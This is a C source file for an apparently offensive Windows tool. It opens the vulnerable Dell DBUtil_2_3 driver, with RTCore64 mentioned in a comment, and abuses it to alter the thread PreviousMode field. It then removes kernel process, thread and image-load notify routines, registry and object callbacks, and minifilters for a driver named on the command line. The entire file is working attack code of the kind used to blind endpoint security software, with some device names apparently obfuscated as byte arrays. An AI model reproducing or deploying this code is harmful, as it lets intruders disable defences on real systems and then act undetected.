#include "struct.h"

BOOL GetProcessID(PSYSTEM_PROCESS_INFORMATION buffer,PWSTR processName,DWORD* processId)
{
	BOOL status = FALSE;
	PSYSTEM_PROCESS_INFORMATION tokenInfo;
	UNICODE_STRING uProc;

	RtlInitUnicodeString(&uProc, processName);
	for (tokenInfo = buffer; tokenInfo->NextEntryOffset; tokenInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)tokenInfo + tokenInfo->NextEntryOffset))
	{

		if (RtlEqualUnicodeString(&uProc, &tokenInfo->ImageName, TRUE))
		{
            
			*processId = HandleToULong(tokenInfo->UniqueProcessId);
			status = TRUE;
			break;
		}
	}

	return status;
}
void InitInformation(PINFORMATION infor)
{
	DWORD MAJOR_VERSION, MINOR_VERSION, BUILD_NUMBER;
    UNICODE_STRING NtPathName;
    NTSTATUS status;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    //BYTE DeviceName[] = { 0x72, 0x2e, 0x72, 0x2e, 0x00, 0x2e, 0x72, 0x2e, 0x6a, 0x2e, 0x6c, 0x2e, 0x7b, 0x2e, 0x5a, 0x2e, 0x47, 0x2e, 0x42, 0x2e, 0x71, 0x2e, 0x1c, 0x2e, 0x71, 0x2e, 0x1d, 0x2e, 0x2e, 0x2e };
    //BYTE DeviceName[] = { 0x72, 0x2e, 0x72, 0x2e, 0x00, 0x2e, 0x72, 0x2e, 0x7c, 0x2e, 0x5a, 0x2e, 0x4d, 0x2e, 0x41, 0x2e, 0x5c, 0x2e, 0x4b, 0x2e, 0x18, 0x2e, 0x1a, 0x2e, 0x2e, 0x2e };
	RtlGetNtVersionNumbers(&MAJOR_VERSION, &MINOR_VERSION, &BUILD_NUMBER);
	BUILD_NUMBER &= 0x00007fff;

    infor->Build = BUILD_NUMBER;
	wprintf(L"[*] Windows Buildnumber %d\n", BUILD_NUMBER);

	infor->isInit = TRUE;//L"\\\\.\\DBUtil_2_3"L"\\\\.\\Rtcore64"


    RtlDosPathNameToNtPathName_U(L"\\\\.\\DBUtil_2_3", &NtPathName, NULL, NULL);
    InitializeObjectAttributes(&ObjectAttributes, &NtPathName, 0, NULL, NULL);

    status = NtCreateFile(&infor->hDevice, GENERIC_READ | GENERIC_WRITE, &ObjectAttributes, &IoStatusBlock, NULL, 0, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
   
	if (NT_SUCCESS(status) )
	{
		switch (BUILD_NUMBER)
		{
        case 22000:
			infor->PreviousMode.PreviousModeOffset = 0x232;
			break;
		default:
			infor->isInit = FALSE;
			NtClose(infor->hDevice);
			PRINT_ERROR(L"Not Support This Windows Version\n");
			break;
		}
	}
	else PRINT_ERROR(L"NtCreateFile %08x\n", status);

}
int wmain(int argc,wchar_t** argv)
{
	INFORMATION infor;

	RtlSecureZeroMemory(&infor, sizeof(INFORMATION));
	InitInformation(&infor);

	if (infor.isInit)
	{
		PreviousMode(&infor);
        PspNotifyEnableMask(&infor);
        
        DeleteRegistryCallBack(InitProcessNotify, &infor, argv[1], L"PspCreateProcessNotifyRoutine", L"PspCreateProcessNotify");
        DeleteRegistryCallBack(InitThreadNotiry, &infor, argv[1], L"PspCreateThreadNotifyRoutine", L"PspCreateThreadNotify");
        DeleteRegistryCallBack(InitLoadImage, &infor, argv[1], L"PspLoadImageNotifyRoutine", L"PspLoadImageNotify");
        
        
        DeleteRegCallBackList(&infor, argv[1]);
        DeleteObCallBackList(InitProcessObject, &infor, argv[1], L"Process");

        DeleteObCallBackList(InitThreadObject, &infor, argv[1], L"Thread");
		
		minifilter(&infor, argv[1]);
		NtClose(infor.hDevice);
        if (moduleInfos)
            LocalFree(moduleInfos);

	}
}


